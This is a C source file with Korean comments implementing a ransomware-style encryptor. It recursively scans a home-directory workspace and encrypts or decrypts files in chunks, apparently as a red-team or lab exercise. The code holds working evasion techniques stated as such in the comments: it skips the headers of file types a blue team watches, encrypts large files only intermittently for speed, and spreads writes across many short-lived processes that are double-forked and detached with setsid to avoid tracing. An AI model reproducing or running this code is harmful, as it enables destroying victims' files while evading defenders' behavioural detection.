#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>    // strcasecmp 사용
#include <unistd.h>     // fork, waitpid
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/time.h> // 시간 측정
#include <dirent.h>
#include <limits.h>
#include <errno.h>
#include <semaphore.h>  // 세마포어
#include <sys/mman.h>   // mmap (공유 메모리)

#include "crypto.h"     // encrypt_chunk_range, decrypt_chunk_range
#include "file_ops.h"   // file_queue, file_count, scan_directory_recursive

// crypto.c와 동일한 값 사용 (4096)
#define CHUNK_SIZE 4096

// 한 PID가 처리할 청크 개수 (10번 → 약 40KB)
#define MAX_WRITES_PER_PID 10

// 프로세스 제한을 위한 세마포어 포인터 (최대 동시 실행 수 제한)
// main 함수에서 mmap으로 할당할 예정
static sem_t *proc_limiter = NULL;

// 헤더가 민감한 확장자 목록 (블루팀이 감시할 확률 높은 것들)
static const char *SENSITIVE_EXTS[] = {
    ".exe", ".dll", ".sys", ".elf",            // 실행 파일
    ".pdf", ".docx", ".xlsx", ".pptx", ".hwp", // 문서
    ".jpg", ".jpeg", ".png", ".gif", ".bmp",   // 이미지
    ".zip", ".tar", ".gz", ".7z", ".rar",      // 압축
    ".mp3", ".mp4", ".avi", ".mov",            // 미디어
    NULL                                       // 끝
};

// 확장자 확인 함수
int is_sensitive_file(const char *filename) {
    const char *ext = strrchr(filename, '.');
    if (!ext) return 0; // 확장자 없음

    for (int i = 0; SENSITIVE_EXTS[i] != NULL; i++) {
        if (strcasecmp(ext, SENSITIVE_EXTS[i]) == 0) {
            return 1; // 민감한 파일임
        }
    }
    return 0; // 일반 파일 
}

/**
 * @brief 파일 크기와 확장자를 고려하여 안전한 시작 위치(Offset) 계산
 * @return 시작해야 할 바이트 위치 (16배수 필수)
 */
long calculate_safe_start_offset(const char *filename, long filesize) {
    // 확장자 불문하고 512바이트보다 작은 파일은 건드리지 않음 -> 음..  굳이 안해도 될거 같긴 한데 일단 ㄱ
    if (filesize < 512) {
        return filesize; // 전체 스킵 유도
    }

    // 민감하지 않은 파일은 처음부터 암호화
    if (!is_sensitive_file(filename)) {
        return 0;
    }

    // 민감한 파일에 대한 크기별 처리
    // 1. 초소형 파일 (1KB 미만) -> 오히려 안 건드는게 좋을 수도 있음, 민감한 파일인데 이정도로 작은게 이상함
    if (filesize < 1024) {
        return filesize; 
    }

    // 2. 소형 파일 (1KB ~ 100KB)
    // 1KB(1024 byte)만 건너뜀, 보통 1KB안에서 헤더 끝남
    if (filesize < 100 * 1024) {
        return 1024; 
    }

    // 2. 중대형 파일 (100KB 이상)
    // 시원하게 4KB(4096 byte) 건너뜀, 우리 주요 손님?들임 -> 가장 안전하게 모시겠습니다 고갱님
    return 4096;
}

/**
 * @brief 프로그램 사용법 출력
 */
static void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [mode]\n", prog_name);
    fprintf(stderr, "Modes:\n");
    fprintf(stderr, "  -e    Encrypt mode\n");
    fprintf(stderr, "  -d    Decrypt mode\n");
}

/**
 * @brief 한 번의 fork로 특정 offset부터 일부 청크만 암/복호화하는 워커 생성
 * @param target        대상 파일 경로
 * @param offset        시작 오프셋
 * @param chunks        처리할 청크 개수
 * @param mode          0: Encrypt, 1: Decrypt
 * @return 0: 성공, 1: 실패
 */
static int spawn_worker(const char *target, long offset, int chunks, int mode) {
    
    // 0. 입장권 확인 (프로세스 수 제한)
    // 빈 자리가 날 때까지 대기 (Blocking)
    if (proc_limiter) sem_wait(proc_limiter);
    
    // 1. 첫 번째 포크 (Main -> Child 1)
    pid_t pid = fork();

    if (pid < 0) {
        perror("First fork failed");
        if (proc_limiter) sem_post(proc_limiter); // 실패 시 입장권 반납
        return 1;
    }

    if (pid == 0) {
        // ---- [Child 1] ----
        
        // [추가] 세션 및 프로세스 그룹 분리
        // 이 호출로 인해 Child 1은 부모(Main)와 다른 '새로운 그룹'의 대장이 됩니다.
        // 이후 생성되는 손자(Child 2)는 이 새로운 그룹에 속하게 되어 추적을 피합니다.
        if (setsid() < 0) {
            // 실패하더라도 공격은 계속 진행 (치명적이지 않음)
             perror("setsid failed");
        }
        
        
        // 2. 두 번째 포크 (Child 1 -> Child 2)
        pid_t grand_pid = fork();

        if (grand_pid < 0) {
            perror("Second fork failed");
            if (proc_limiter) sem_post(proc_limiter);
            _exit(1);
        }
        if (grand_pid == 0) {
            // ---- [Child 2] ----
            int ret;
            if (mode == 0) {
                ret = encrypt_chunk_range(target, offset, chunks);
            } else {
                ret = decrypt_chunk_range(target, offset, chunks);
            }

            // 작업 완료 이후 입장권 반납 (Main이 대기 중이면 깨어남)3
            // 손자 프로세스는 부모와 메모리가 다르지만, mmap된 영역은 공유됨.
            if (proc_limiter) sem_post(proc_limiter);

            if (ret != 0) {
                _exit(1);
            }
            _exit(0);
        }
        // 자식2를 낳았으므로 자식1의 역할은 끝. 즉시 종료하여 손자를 '고아'로 만듦.
        // 아직 손자가 일을 하고 있으므로 sem_post를 하면 안됨.
        _exit(0);
    }
    else {
        // ---- [Parent] ----
        // 자식 1이 종료될 때까지만 기다림.
        // 자식 1은 손자를 낳자마자 바로 죽으므로 waitpid는 거의 즉시 반환됨.
        int status;
        if (waitpid(pid, &status, 0) < 0) {
            perror("waitpid failed");
            return 1;
        }

        // 메인 프로세스는 손자(실제 일꾼)를 기다리지 않고 바로 다음 루프로 넘어감.
        return 0;
    }
}


/**
 * @brief 파일 큐(file_queue)에 쌓여 있는 파일들에 대해
 *        자식 프로세스를 생성하면서 순차적으로 공격(암/복호화)을 수행
 * @param mode 0: Encrypt, 1: Decrypt
 */
void execute_attack(int mode) {
    for (int i = 0; i < file_count; i++) {
        char *target = file_queue[i];

        // 1. 파일 정보 획득 (크기 확인)
        struct stat st;
        if (stat(target, &st) != 0) {
            perror("[SKIP] stat failed");
            continue; // 파일이 없거나 접근 불가
        }
        long total_size = st.st_size;
        if (total_size <= 0) {
            printf("[SKIP] 빈 파일: %s\n", target);
            continue;
        }

        long write_amount = (long)MAX_WRITES_PER_PID * CHUNK_SIZE; // 한 PID 작업량 (약 40KB)
        long skip_distance = 0;

        // ============================================================
        // 파일 크기에 따른 간헐적 암/복호화(Skip) 전략
        // (Encrypt/Decrypt 모두 동일 패턴 사용해야 복호화 가능)
        // ============================================================
        if (total_size < 1024 * 1024) {
            // [Case 1] 1MB 미만: 건너뛰지 않음 (100% 처리)
            skip_distance = 0;
        } else if (total_size < 100 * 1024 * 1024) {
            // [Case 2] 100MB 미만: 약 10%만 처리
            // 40KB 처리 후 -> 360KB 건너뜀
            skip_distance = write_amount * 9;
        } else {
            // [Case 3] 100MB 이상: 속도 위주
            // 40KB 처리 후 -> 10MB 건너뜀
            skip_distance = 10 * 1024 * 1024;
        }

        long current_offset = calculate_safe_start_offset(target, total_size);
        // 만약 계산된 시작 위치가 파일 크기보다 크거나 같은 경우
        if (current_offset >= total_size) {
            printf("[SAFE SKIP] %s (Size: %ld, Too small/Sensitive)\n", target, total_size);
            continue; // 이건 넘어감
        }

        printf("[TARGET] %s (Size: %ld bytes, Skip: %ld bytes) %s 시작\n",
               target,
               total_size,
               skip_distance,
               (mode == 0) ? "암호화" : "복호화");

        
        int child_round = 0;
        int attack_failed = 0;
        // [추가] 마지막으로 암호화가 끝난 위치를 추적하는 변수
        long last_encrypted_end = 0;

        // 2. 이어달리기 루프
        while (current_offset < total_size) {
            int ret = spawn_worker(target, current_offset, MAX_WRITES_PER_PID, mode);
            child_round++;
            
            // 세마포어 제어가 있으므로 usleep은 필수가 아니지만, 
            // 너무 빠른 루프 회전으로 인한 CPU 점유율 조절용으로 짧게 유지
            usleep(10000);

            if (ret != 0) {
                attack_failed = 1;
                break;  // 이 파일에 대한 공격 중단
            }
            
            // [추가] 이번에 처리한 구간의 끝 위치 기록
            long this_end = current_offset + write_amount;
            if (this_end > total_size) this_end = total_size; // 파일 끝을 넘지 않음
            
            if (this_end > last_encrypted_end) {
                last_encrypted_end = this_end;
            }

            // 자식이 처리한 양 + 전략적으로 건너뛸 양
            current_offset += (write_amount + skip_distance);
        }

        // 3. Tail 처리 (파일 끝부분 구조 파괴/복구용)
        //    Encrypt/Decrypt 모두 같은 위치를 한 번 더 처리해야
        //    CTR 기반에서 정확히 되돌릴 수 있음.
        
        // [수정] 'last_encrypted_end'를 사용하여 중복 처리를 막음
        if (!attack_failed && total_size > CHUNK_SIZE) {
            
            long tail_offset = total_size - CHUNK_SIZE;
            
            // 만약 계산된 꼬리 위치가 이미 처리된 영역과 겹치면?
            // -> 겹치지 않도록 시작 위치를 '처리된 끝부분'으로 미룸
            if (tail_offset < last_encrypted_end) {
                tail_offset = last_encrypted_end;
            }

            // 조정 후에도 아직 파일 끝까지 남은 공간이 있다면 실행
            if (tail_offset < total_size) {
                // 남은 크기가 1개 청크보다 작아도 encrypt_chunk_range 내부에서 
                // 파일 끝(EOF)을 만나면 알아서 멈추므로 안전함.
                int ret = spawn_worker(target, tail_offset, 1, mode);
                
                if (ret != 0) {
                    printf("[SKIP] Tail 처리 실패: %s\n", target);
                    attack_failed = 1;
                } else {
                    child_round++;
                }
            }
        }

        if (!attack_failed) {
            printf("[COMPLETE] %s 처리 완료 (총 %d회 PID 교체)\n",
                   target, child_round);
        } else {
            printf("[STOP] %s 처리 중단됨\n", target);
        }
    }
}


/**
 * @brief 프로그램 시작점
 */
int main(int argc, char *argv[]) {
    // 시작 시간 기록
    struct timeval start_time, end_time;
    gettimeofday(&start_time, NULL);

    if (argc != 2) {  // 인자로 모드만 받음
        fprintf(stderr, "Error: Invalid arguments.\n\n");
        print_usage(argv[0]);
        return 1;
    }

    // 모드 파싱
    int mode;
    if (strcmp(argv[1], "-e") == 0) {
        mode = 0;  // Encrypt
    } else if (strcmp(argv[1], "-d") == 0) {
        mode = 1;  // Decrypt
    } else {
        fprintf(stderr, "Error: Invalid mode '%s'\n\n", argv[1]);
        print_usage(argv[0]);
        return 1;
    }


    // [/home/user/workspace/illusion]으로 고정
    // HOME 환경변수 기준으로 백엔드 경로 지정
    const char *home_dir = getenv("HOME");
    if (!home_dir) {
        fprintf(stderr, "Error: HOME environment variable not set.\n");
        return 1;
    }
    
    char start_path[PATH_MAX];

    if (snprintf(start_path, sizeof(start_path),
             "%s/workspace/illusion", home_dir) >= (int)sizeof(start_path)) {
        fprintf(stderr, "Error: Target path is too long.\n");
        return 1;
    }
    
    
    printf("--- Start Traversal ---\n");
    printf("  Target Mode: %s\n", (mode == 0) ? "ENCRYPT" : "DECRYPT");
    printf("  Target Path: %s\n", start_path);
    printf("------------------------\n");
    
    // 디렉터리 스캔 → file_queue 채우기
    scan_directory_recursive(start_path);

    printf(">>> Found %d files\n", file_count);

    // [추가] 세마포어 초기화 (익명 공유 메모리 사용)
    proc_limiter = mmap(NULL, sizeof(sem_t),
                        PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    if (proc_limiter == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    // 세마포어 값 설정 (1: 공유 모드, 100: 동시 실행 프로세스 개수)
    // 100으로 설정하면 프로세스가 최대 100개까지만 생성되고, 하나가 끝나야 다음 하나가 생성됨
    if (sem_init(proc_limiter, 1, 100) == -1) {
        perror("sem_init failed");
        return 1;
    }

    execute_attack(mode);

    // 리소스 정리
    sem_destroy(proc_limiter);
    munmap(proc_limiter, sizeof(sem_t));

    printf("------------------------\n");
    printf("--- End Traversal ---\n");

    // 종료 시간 기록 및 계산
    gettimeofday(&end_time, NULL);
    double elapsed_sec = (end_time.tv_sec - start_time.tv_sec) + 
                         (end_time.tv_usec - start_time.tv_usec) / 1000000.0;

    printf("\n");
    printf("========================================\n");
    printf(" [TIMING] Total Execution Time: %.4f sec\n", elapsed_sec);
    printf("========================================\n");
    return 0;
}
